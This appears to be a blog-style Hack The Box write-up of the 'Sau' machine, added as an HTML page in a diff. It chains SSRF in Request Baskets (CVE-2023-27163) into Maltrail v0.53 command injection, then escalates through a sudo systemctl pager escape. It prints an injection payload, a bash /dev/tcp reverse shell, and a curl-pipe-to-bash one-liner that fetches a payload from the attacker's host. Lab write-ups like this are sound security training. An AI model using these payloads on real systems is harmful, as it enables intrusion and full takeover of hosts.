@@ -1,0 +1,147 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sau Writeup HTB - Astro boilerplate</title><meta name="description" content="#SSRF #CVE-2023-27163 #Maltrail #OSCommandInjection #ReverseShell #PrivilegeEscalation #SudoMisconfiguration #RootAccess."><meta name="author" content="Roqeeb"><link rel="alternate" type="application/rss+xml" href="/rss.xml"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="/_astro/index.CvLV1VIh.css" /></head> <body class="bg-slate-900 text-gray-100"> <div class="mx-auto max-w-screen-lg px-3 py-6"><div class="flex flex-col gap-y-3 sm:flex-row sm:items-center sm:justify-between"><a href="/"><div class="flex items-center bg-gradient-to-br from-sky-500 to-cyan-400 bg-clip-text text-xl font-bold text-transparent"><svg class="mr-1 h-10 w-10 stroke-cyan-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M0 0h24v24H0z" stroke="none"></path><rect x="3" y="12" width="6" height="8" rx="1"></rect><rect x="9" y="8" width="6" height="12" rx="1"></rect><rect x="15" y="4" width="6" height="16" rx="1"></rect><path d="M4 20h14"></path></svg>Roqeeb&#x27;s Blog</div></a><nav><ul class="flex gap-x-3 font-medium text-gray-200"><li class="hover:text-white"><a href="/posts/" target="_self">Blogs</a></li><li class="hover:text-white"><a href="/posts/" target="_self">Writeups</a></li><li class="hover:text-white"><a href="https://x.com/FireEyesOMG" target="_blank">Twitter</a></li><li class="hover:text-white"><a href="https://github.com/0xRoqeeb" target="_blank">Github</a></li></ul></nav></div></div>  <div class="mx-auto max-w-screen-lg px-3 py-6"><h1 class="text-center text-3xl font-bold">Sau Writeup HTB</h1><div class="mt-2 text-center text-sm text-gray-400">By <!-- -->Roqeeb<!-- --> on<!-- --> <!-- -->Mar 2, 2020</div><div class="mx-auto mt-5 "><div class="aspect-w-3 aspect-h-2"><img class="h-full w-full rounded-lg object-cover object-center" src="https://labs.hackthebox.com/storage/avatars/1ea2980b9dc2d11cf6a3f82f10ba8702.png" alt="Image post 5" loading="lazy"/></div><div class="prose prose-invert mt-8 prose-img:rounded-lg"> <h1 id="hack-the-box---sau-writeup">Hack The Box - Sau Writeup</h1>
+<h3 id="by-roqeeb">by Roqeeb</h3>
+<h1 id="introduction">Introduction</h1>
+<p>Hello welcome to my first-ever published writeup,Today we’ll be rooting an easy rated box from hackthebox, i was able to learn new things from this box and i found it interesting, i hope you enjoy it too.<br>
+Let’s go</p>
+<h1 id="information-gathering">Information Gathering</h1>
+<h2 id="nmap">Nmap</h2>
+<p>i used nmap to scan the ip address with this command</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span>nmap -sC -sV 10.10.11.224 -p- -vvv -T3 -oN nmap</span></span></code></pre>
+<p>From our scan there are two open ports opened ports 22 and 55555 ,due the speed of my scan i also got some false positives port 80 and 6003 with the ‘filtered’ state, i will be ignoring because accessing them provides no response.</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2"># Nmap 7.92 scan initiated Tue Jul 25 06:28:06 2023 as: nmap -sC -sV -vvv -T3 -oN nmap2 10.10.11.224</span></span>
+<span class="line"><span style="color:#F8F8F2">Increasing send delay for 10.10.11.224 from 0 to 5 due to 21 out of 69 dropped probes since last increase.</span></span>
+<span class="line"><span style="color:#F8F8F2">Increasing send delay for 10.10.11.224 from 5 to 10 due to 11 out of 18 dropped probes since last increase.</span></span>
+<span class="line"><span style="color:#F8F8F2">Increasing send delay for 10.10.11.224 from 10 to 20 due to 11 out of 30 dropped probes since last increase.</span></span>
+<span class="line"><span style="color:#F8F8F2">Nmap scan report for 10.10.11.224</span></span>
+<span class="line"><span style="color:#F8F8F2">Host is up, received conn-refused (0.13s latency).</span></span>
+<span class="line"><span style="color:#F8F8F2">Scanned at 2023-07-25 06:28:07 WAT for 170s</span></span>
+<span class="line"><span style="color:#F8F8F2">Not shown: 996 closed tcp ports (conn-refused)</span></span>
+<span class="line"><span style="color:#F8F8F2">PORT      STATE    SERVICE REASON      VERSION</span></span>
+<span class="line"><span style="color:#F8F8F2">22/tcp    open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span style="color:#F8F8F2">| ssh-hostkey: </span></span>
+<span class="line"><span style="color:#F8F8F2">|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)</span></span>
+<span class="line"><span style="color:#F8F8F2">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=</span></span>
+<span class="line"><span style="color:#F8F8F2">|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)</span></span>
+<span class="line"><span style="color:#F8F8F2">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=</span></span>
+<span class="line"><span style="color:#F8F8F2">|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)</span></span>
+<span class="line"><span style="color:#F8F8F2">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi</span></span>
+<span class="line"><span style="color:#F8F8F2">80/tcp    filtered http    no-response</span></span>
+<span class="line"><span style="color:#F8F8F2">6003/tcp  filtered X11:3   no-response</span></span>
+<span class="line"><span style="color:#F8F8F2">55555/tcp open     unknown syn-ack</span></span>
+<span class="line"><span style="color:#F8F8F2">| fingerprint-strings: </span></span>
+<span class="line"><span style="color:#F8F8F2">|   FourOhFourRequest: </span></span>
+<span class="line"><span style="color:#F8F8F2">|     HTTP/1.0 400 Bad Request</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Content-Type: text/plain; charset=utf-8</span></span>
+<span class="line"><span style="color:#F8F8F2">|     X-Content-Type-Options: nosniff</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Date: Tue, 25 Jul 2023 05:29:38 GMT</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Content-Length: 75</span></span>
+<span class="line"><span style="color:#F8F8F2">|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$</span></span>
+<span class="line"><span style="color:#F8F8F2">|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span></span>
+<span class="line"><span style="color:#F8F8F2">|     HTTP/1.1 400 Bad Request</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Content-Type: text/plain; charset=utf-8</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Connection: close</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Request</span></span>
+<span class="line"><span style="color:#F8F8F2">|   GetRequest: </span></span>
+<span class="line"><span style="color:#F8F8F2">|     HTTP/1.0 302 Found</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Content-Type: text/html; charset=utf-8</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Location: /web</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Date: Tue, 25 Jul 2023 05:29:06 GMT</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Content-Length: 27</span></span>
+<span class="line"><span style="color:#F8F8F2">|     href="/web">Found&#x3C;/a>.</span></span>
+<span class="line"><span style="color:#F8F8F2">|   HTTPOptions: </span></span>
+<span class="line"><span style="color:#F8F8F2">|     HTTP/1.0 200 OK</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Allow: GET, OPTIONS</span></span>
+<span class="line"><span style="color:#F8F8F2">|     Date: Tue, 25 Jul 2023 05:29:07 GMT</span></span>
+<span class="line"><span style="color:#F8F8F2">|_    Content-Length: 0</span></span></code></pre>
+<p>I will start enumeration from port 55555, from our scan we can see there’s a webserver running on that port<br>
+i opened it in my web browser and there’s a webapp called request baskets, on the bottom left there’s a version number
+<img src="https://github.com/0xRoqeeb/writeups/assets/49154037/0be33d47-172b-4250-90f2-3ae4d4bd558d" alt="homepage"></p>
+<p>i started poking around the site to find out how it works, it’s an application that allows you to create a basket which gives you a url and any request made to that url will be collected in your basket hence the name requests basket</p>
+<p><img src="https://github.com/0xRoqeeb/writeups/assets/49154037/e954d827-d88d-44f7-80a1-6e64e18f2e59" alt="newbasket"></p>
+<p>i tested GET and POST requests on the url using curl i didnt get a response in my terminal but the requests were collected in the request basket</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">┌──(mofe㉿mofe)-[~]</span></span>
+<span class="line"><span style="color:#F8F8F2">└─$ curl http://10.10.11.224:55555/fourth                                                                                                                                                                          </span></span>
+<span class="line"><span style="color:#F8F8F2">┌──(mofe㉿mofe)-[~]</span></span>
+<span class="line"><span style="color:#F8F8F2">└─$ curl -X POST http://10.10.11.224:55555/fourth</span></span></code></pre>
+<p><img src="https://github.com/0xRoqeeb/writeups/assets/49154037/d17393da-513c-4269-8910-cab229433106" alt="eq"></p>
+<h1 id="vulnerability-assessment">Vulnerability Assessment</h1>
+<p>Next I created a new basket and intercepted the request with burpsuite ,it didn’t reveal much.<br>
+After that i looked up the version number of requests basket online to check if this current version was vulnerable and i found out that it was susceptible to SSRF, it also has a POC <a href="https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">CVE-2023-27163</a></p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}</span></span></code></pre>
+<p>It turns out that the <em>/api/baskets/name</em> and <em>/baskets/name</em> are the  API endpoints vulnerable to unauthenticated SSRF.
+Requests sent to <em>/baskets/name</em> url will be reflected on the url in the <strong>forward_url</strong> parameter</p>
+<p>you can do this with a curl command</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'</span></span></code></pre>
+<p>but i’ll be doing it directly from the web application, to do that we navigate to our baskets page and click on the settings icon top right
+<img src="https://github.com/0xRoqeeb/writeups/assets/49154037/f017b677-84d7-49a5-ab37-1bfb6e5edd26" alt="2023-07-25_08-51"></p>
+<p>on the configuration page we set the fields as follows:-<br>
+<em><strong>Forward URL</strong></em>:<em><a href="http://127.0.0.1:80/">http://127.0.0.1:80/</a></em> (to reveal any internal websites, this field will forward our requests from the basket url to the hidden webpage)</p>
+<p><em><strong>Proxy Response</strong></em> : <em>true</em> ( i set this field to false as the POC stated but i didn’t get a response, it only made sense to set it to true)<br>
+<em><strong>Expand Forward Path</strong></em> : <em>true</em><br>
+<img src="https://github.com/0xRoqeeb/writeups/assets/49154037/7c68fe7a-8e65-4be6-8000-a3718e657963" alt="2023-07-25_07-55"></p>
+<p>after that click apply to save changes</p>
+<p>now we access our basket through the url again and this time we’re seeing something different, we come across a CSS starved website ,looking at the bottom left i found out this website was <em>Powered by Maltrail (v0.53)</em>
+<img src="https://github.com/0xRoqeeb/writeups/assets/49154037/d90ba8b4-3bb1-422c-858f-cf2de0f3fa7f" alt="2023-07-25_13-03_1"></p>
+<p>A bit of googling and i found out this version was vulnerable to Unauthenticated OS Command Injection, the username parameter in the <em>/login</em> page contained the command injection vulnerability<br>
+<a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">POC</a></p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'</span></span></code></pre>
+<p>since we’ll be testing the <em>/login</em> page let’s update our <em>forward_url</em> parameter</p>
+<p>Using a curl command</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/login","proxy_response": True,"insecure_tls": false,"expand_path": true,"capacity": 250}'</span></span></code></pre>
+<p>or we can edit our existing basket from the basket configuration page</p>
+<p><img src="https://github.com/0xRoqeeb/writeups/assets/49154037/cf15037c-c400-4c14-8985-23dab848265c" alt="damn"></p>
+<p>trying to access the login page from the browser gives us this response, so we’ll have to use curl from here
+<img src="https://github.com/0xRoqeeb/writeups/assets/49154037/467fed24-5dab-4eea-ba89-d16fe65f6443" alt="2023-07-25_08-14"></p>
+<h1 id="exploitation">Exploitation</h1>
+<p>Getting a reverse shell</p>
+<p>I created a shell.sh file with my payload in it and setup a python webserver to host it on port 80 preferably
+make sure the payload file is in the same folder you set up the webserver</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">┌──(mofe㉿mofe)-[~/tools]</span></span>
+<span class="line"><span style="color:#F8F8F2">└─$ cat shell.sh               </span></span>
+<span class="line"><span style="color:#F8F8F2">bash -i >&#x26; /dev/tcp/10.10.14.135/4444 0>&#x26;1</span></span>
+<span class="line"><span style="color:#F8F8F2">                                                                                  </span></span>
+<span class="line"><span style="color:#F8F8F2">┌──(mofe㉿mofe)-[~/tools]</span></span>
+<span class="line"><span style="color:#F8F8F2">└─$ sudo python3 -m http.server 80</span></span>
+<span class="line"><span style="color:#F8F8F2">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span></span>
+<span class="line"></span></code></pre>
+<p>so we run our one liner</p>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2"> curl "http://10.10.11.224:55555/fourth" --data 'username=;` curl 10.10.14.135/shell.sh | bash` '</span></span></code></pre>
+<p>and immediately we get a shell, first things first we upgrade our shell</p>
+<ul>
+<li>python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</li>
+<li>Ctrl^Z to background the shell</li>
+<li>stty raw -echo ; fg to foreground the shell</li>
+<li>then press the enter button twice</li>
+<li>once were back in our shell
+export TERM=xterm</li>
+</ul>
+<pre class="astro-code monokai" style="background-color:#272822;color:#F8F8F2; overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:#F8F8F2">┌──(mofe㉿mofe)-[~]</span></span>
+<span class="line"><span style="color:#F8F8F2">└─$ nc -lvnp 4444 </span></span>
+<span class="line"><span style="color:#F8F8F2">listening on [any] 4444 ...</span></span>
+<span class="line"><span style="color:#F8F8F2">connect to [10.10.14.135] from (UNKNOWN) [10.10.11.224] 60034</span></span>
+<span class="line"><span style="color:#F8F8F2">bash: cannot set terminal process group (890): Inappropriate ioctl for device</span></span>
+<span class="line"><span style="color:#F8F8F2">bash: no job control in this shell</span></span>
+<span class="line"><span style="color:#F8F8F2">puma@sau:/opt/maltrail$  python3 -c </span><span style="color:#E6DB74">'import pty; pty.spawn("/bin/bash")'</span></span>
+<span class="line"><span style="color:#F8F8F2"> python3 -c 'import pty; pty.spawn("/bin/bash")'</span></span>
+<span class="line"><span style="color:#F8F8F2">puma@sau:/opt/maltrail$ ^Z</span></span>
+<span class="line"><span style="color:#F8F8F2">zsh: suspended  nc -lvnp 4444</span></span>
+<span class="line"><span style="color:#F8F8F2">                                                                                  </span></span>
+<span class="line"><span style="color:#F8F8F2">┌──(mofe㉿mofe)-[~]</span></span>
+<span class="line"><span style="color:#F8F8F2">└─$ stty raw -echo ; fg          </span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">[1]  + continued  nc -lvnp 4444</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F8F8F2">puma@sau:/opt/maltrail$ export TERM=xterm</span></span>
+<span class="line"><span style="color:#F8F8F2">puma@sau:/opt/maltrail$</span></span></code></pre>
+<p>now we have an interactive shell.</p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Once we get initial access the road to root on sau is a piece of cake</p>
+<p>running the command sudo -l to see the commands our current user can run
+<img src="https://github.com/0xRoqeeb/writeups/assets/49154037/42af050d-2232-49e5-ae63-477b543f9966" alt="2023-07-25_08-19"></p>
+<p>we can run <em>/usr/bin/systemctl status trail.service</em> as root and <strong>NOPASSWD</strong> means we can invoke the sudo command without a password<br>
+I checked gtfobins for the binary we have access to and luckily there’s an entry for <a href="https://gtfobins.github.io/gtfobins/systemctl/">systemctl</a></p>
+<p><img src="https://github.com/0xRoqeeb/writeups/assets/49154037/e15e2ac0-857f-4213-8296-6c3bed8c0223" alt="2023-07-25_08-25_1"></p>
+<p>Let’s run the command <code>sudo /usr/bin/systemctl status trail.service</code>
+and input “!sh” to spawn a shell</p>
+<p><img src="https://github.com/0xRoqeeb/writeups/assets/49154037/91a6e8f4-f1fb-4cde-bd65-5e3c2b083e94" alt="2023-07-25_08-29"></p>
+<p>and we’re root:)</p> </div></div></div> <div class="mx-auto max-w-screen-lg px-3 py-6"><div class="flex flex-col items-center justify-between gap-6 sm:flex-row"><div class="sm:w-7/12"><div class="text-3xl font-bold">Subscribe to my <span class="bg-gradient-to-br from-sky-500 to-cyan-400 bg-clip-text text-transparent">Newsletters</span></div><p class="mt-3 text-gray-300">Join my newsletter to stay updated on the latest in cybersecurity, tips, and write-ups. Get exclusive insights straight to your inbox!.</p></div><div class="w-full sm:w-5/12"><form class="flex rounded-full bg-slate-800 px-4 py-2 focus-within:ring-2 focus-within:ring-cyan-600 hover:ring-2 hover:ring-cyan-600"><input class="w-full appearance-none bg-slate-800 focus:outline-none"/><button class="ml-2 shrink-0 rounded-full bg-gradient-to-br from-sky-500 to-cyan-400 px-3 py-1 text-sm font-medium hover:from-sky-700 hover:to-cyan-600 focus:outline-none focus:ring-2 focus:ring-cyan-600/50" type="submit">Subscribe</button></form></div></div></div>  <!-- <Footer /> --> </body></html>
